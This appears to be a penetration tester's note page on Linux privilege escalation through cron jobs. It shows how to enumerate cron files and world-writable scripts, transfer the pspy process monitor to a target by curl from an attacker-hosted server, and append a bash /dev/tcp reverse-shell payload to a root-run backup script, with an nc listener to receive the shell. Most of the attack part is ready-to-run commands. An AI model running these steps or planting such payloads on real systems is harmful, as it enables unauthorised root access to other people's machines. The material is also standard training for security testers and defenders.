---
Primary_category: "[[LINUX PRIVESC]]"
title: "LINUX CRON JOB ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *Enumeration*

##### *Cron.d Directory*

Typically a non-privileged user has read permissions over the existing *CRON* files within the **`/etc/cron.d`** directory

We should also always check whether the current user has write permissions on any of them

```bash
ls -l /etc/cron.d
```

##### *PSpy*

> ***[PSpy](https://github.com/dominicbreuker/pspy)***

###### *Setup*

> ***From the Attacker*** ⚔️ 

- ***Cloning the Github Repository and Compiling the Go Binary***

```bash
git clone https://github.com/dominicbreuker/pspy PSpy
```

```bash
cd !$ && go build -ldflags '-s -w' .
upx pspy
```

- ***Transferring the binary to the target***

> ***From the Attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the Target*** 🎯

```bash
cd /dev/shm && curl --silent --location --request GET 'http://<ATTACKER_IP>/pspy' --remote-name
```

###### *Usage*

```bash
chmod 700 pspy && ./pspy -pf -i 1000
```

---

#### *Abuse*

##### *World-Writable File*

Let's suppose that we have compromised an entire web application and stablished a connection to the target through a ***[[SHELLS AND PAYLOADS#Reverse Shell|Reverse Shell]]***

Then, we start enumerating the target in order to be able to privilege escalation and we find out an interesting *backup.bash* script that we have write permissions for

We have done this by issuing the following command, which search the system for files on which the current user has write permissions

```bash
find / -path '/proc' -prune -o -perm -0002 -type f 2> /dev/null
```

Since there is a script called *backup.bash*, there may be a *Cron Job* that runs it at regular intervals

Therefore, we could transfer a *PSpy* binary to the target in order to monitor new system processes

We can run it as follows →

```bash
./pspy -pf -i 1000
```

After a while, we see that a *Cron Job* runs the *backup.bash* script and a *TAR* file is created within the **`/var/www/html`** directory

So, since we have write permissions over the given script, we can simply edit it and add the following payload at the end

```bash
bash -i &> /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

Then, we have to run the following command from the attacker machine in order to receive the incoming shell a.k.a *Reverse Shell*

```bash
nc -nlvp <PORT>
```